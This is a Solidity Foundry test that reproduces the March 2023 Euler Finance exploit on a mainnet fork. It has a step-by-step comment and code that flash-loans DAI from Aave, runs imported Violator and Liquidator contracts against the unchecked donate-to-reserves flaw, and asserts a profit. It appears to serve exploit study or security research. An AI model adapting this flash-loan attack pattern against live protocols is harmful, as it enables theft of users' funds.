//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {
    IERC20,
    EToken,
    DToken,
    IEuler,
    IAaveFlashloan,
    Violator,
    Liquidator
} from "../../src/euler2023/EulerExploit.sol";
import {ForkUtils} from "../common/ForkUtils.t.sol";

/**
 * @notice Euler Finance Exploit Test - March 2023
 * @dev Attack Steps:
 *      1. Flash loan 30M DAI from Aave
 *      2. Deploy Violator and Liquidator contracts
 *      3. Transfer flash loan to Violator
 *      4. Violator executes exploit:
 *         a. Deposit 20M DAI as collateral
 *         b. Mint 200M eDAI (first borrow, 10x leverage)
 *         c. Repay 10M DAI to improve health score
 *         d. Mint 200M eDAI again (second borrow, layered leverage)
 *         e. Donate 100M eDAI to reserves (vulnerability: no health check)
 *         f. Health score drops below 1.0, account becomes liquidatable
 *      5. Liquidator liquidates Violator at discount
 *      6. Withdraw profit from Euler protocol
 *      7. Repay flash loan with profit
 */
contract EulerExploitTest is Test, ForkUtils {
    // Contract addresses
    IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    EToken constant E_DAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC);
    DToken constant D_DAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686);
    IEuler constant Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    IAaveFlashloan constant AAVE_V2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
    address constant EULER_PROTOCOL = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    // Exploit contracts
    Violator public violator;
    Liquidator public liquidator;
    uint256 constant BLOCK_NUMBER = 16_817_995; //one block before the attack happened

    function setUp() public {
        // Setup fork at block before attack
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        setupFork("euler2023", rpcUrl, BLOCK_NUMBER);
        selectFork("euler2023");
    }

    function testEulerExploit() public {
        uint256 attackerBalanceBefore = DAI.balanceOf(address(this));
        // Prepare flash loan parameters
        uint256 aaveFlashloanAmount = 30_000_000 * 1e18;
        address[] memory assets = new address[](1);
        assets[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = aaveFlashloanAmount;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        bytes memory params = abi.encode();

        // Execute flash loan (triggers executeOperation callback)
        AAVE_V2.flashLoan({
            receiverAddress: address(this),
            assets: assets,
            amounts: amounts,
            modes: modes,
            onBehalfOf: address(this),
            params: params,
            referralCode: 0
        });

        //Attacker receives 8.87M profit after paying the flash loan back
        console.log("Attacker balance after flashloan", DAI.balanceOf(address(this)) / 1e18);
        assertGt(DAI.balanceOf(address(this)), attackerBalanceBefore, "Exploit should be profitable"); 
    }

    // Callback function called by Aave flash loan
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // Approve Aave to withdraw flash loan repayment
        DAI.approve(address(AAVE_V2), type(uint256).max);

        // Deploy exploit contracts
        violator = new Violator(address(E_DAI), address(D_DAI), address(Euler), address(DAI));
        liquidator = new Liquidator(address(E_DAI), address(D_DAI), address(Euler), address(DAI));

        // Transfer flash loan funds to violator
        DAI.transfer(address(violator), DAI.balanceOf(address(this)));

        // Execute exploit to make account insolvent
        violator.violate();

        // Liquidate violator and extract profit
        liquidator.liquidate(address(violator));

        return true;
    }
}
